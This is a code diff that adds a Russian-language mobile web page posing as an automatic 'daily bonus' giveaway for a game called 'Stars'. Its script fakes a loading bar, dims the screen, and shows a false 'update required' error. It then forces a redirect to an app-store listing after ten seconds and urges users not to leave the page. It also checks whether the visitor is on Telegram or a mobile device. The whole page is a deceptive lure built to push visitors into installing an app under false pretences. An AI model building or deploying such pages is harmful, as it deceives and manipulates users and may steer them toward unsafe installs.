@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎁 Бонус Звёзды</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #000000;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+            transition: filter 1.5s ease;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #ffcc00;
+        }
+        
+        p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            opacity: 0.8;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+        
+        .dark-mode {
+            filter: brightness(15%);
+        }
+        
+        .error-screen {
+            display: none;
+        }
+        
+        .error-screen.active {
+            display: block;
+        }
+        
+        button {
+            background: #ff3333;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            margin-top: 20px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .emoji {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loadingScreen">
+        <div class="emoji">🎮</div>
+        <h1>ИГРА "ЗВЁЗДЫ"</h1>
+        <p>Автоматическое получение ежедневного бонуса...</p>
+        
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        
+        <p id="status">Инициализация системы...</p>
+    </div>
+    
+    <div class="container error-screen" id="errorScreen">
+        <div class="emoji">⚠️</div>
+        <h1>ТРЕБУЕТСЯ ОБНОВЛЕНИЕ</h1>
+        <p>Для получения бонуса установите последнюю версию игры</p>
+        <button id="installBtn">УСТАНОВИТЬ ОБНОВЛЕНИЕ</button>
+    </div>
+
+    <script>
+        // Конфигурация
+        const CONFIG = {
+            darkenDelay: 2000,    // Когда затемнить экран
+            showErrorDelay: 5000, // Когда показать ошибку
+            redirectUrl: 'market://details?id=com.stars.game' // Ссылка на игру
+        };
+        
+        // Элементы
+        const progressBar = document.getElementById('progress');
+        const statusText = document.getElementById('status');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const errorScreen = document.getElementById('errorScreen');
+        const installBtn = document.getElementById('installBtn');
+        const body = document.body;
+        
+        // Функция обновления прогресса
+        function updateProgress(percent, text) {
+            progressBar.style.width = percent + '%';
+            statusText.textContent = text;
+        }
+        
+        // Функция затемнения экрана
+        function darkenScreen() {
+            body.classList.add('dark-mode');
+            console.log('[SYSTEM] Экран затемнён до 15% яркости');
+        }
+        
+        // Функция показа ошибки
+        function showError() {
+            loadingScreen.style.display = 'none';
+            errorScreen.classList.add('active');
+            console.log('[SYSTEM] Показано сообщение об ошибке');
+        }
+        
+        // Функция редиректа в магазин
+        function redirectToStore() {
+            console.log('[SYSTEM] Перенаправление в магазин приложений');
+            window.location.href = CONFIG.redirectUrl;
+        }
+        
+        // Основная функция
+        function startProcess() {
+            console.log('[SYSTEM] Начало автоматического процесса...');
+            
+            // Шаг 1: Прогресс бар
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 1;
+                updateProgress(progress, `Загрузка... ${progress}%`);
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    updateProgress(100, 'Завершение...');
+                }
+            }, 30);
+            
+            // Шаг 2: Затемнение экрана
+            setTimeout(darkenScreen, CONFIG.darkenDelay);
+            
+            // Шаг 3: Показать ошибку
+            setTimeout(showError, CONFIG.showErrorDelay);
+            
+            // Шаг 4: При клике на кнопку - редирект
+            installBtn.addEventListener('click', redirectToStore);
+            
+            // Шаг 5: Автоматический редирект через 10 секунд
+            setTimeout(redirectToStore, 10000);
+        }
+        
+        // Запуск при загрузке
+        window.onload = function() {
+            console.log('[SYSTEM] Страница загружена, запуск...');
+            
+            // Определяем устройство
+            const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
+            const isTelegram = /Telegram/i.test(navigator.userAgent);
+            
+            console.log('[INFO] Устройство:', navigator.userAgent);
+            console.log('[INFO] Мобильное:', isMobile);
+            console.log('[INFO] Telegram:', isTelegram);
+            
+            // Запускаем процесс
+            setTimeout(startProcess, 1000);
+        };
+        
+        // Блокируем кнопку "Назад"
+        window.onbeforeunload = function() {
+            return "Идет выдача бонуса... Не закрывайте страницу!";
+        };
+    </script>
+</body>
+</html>
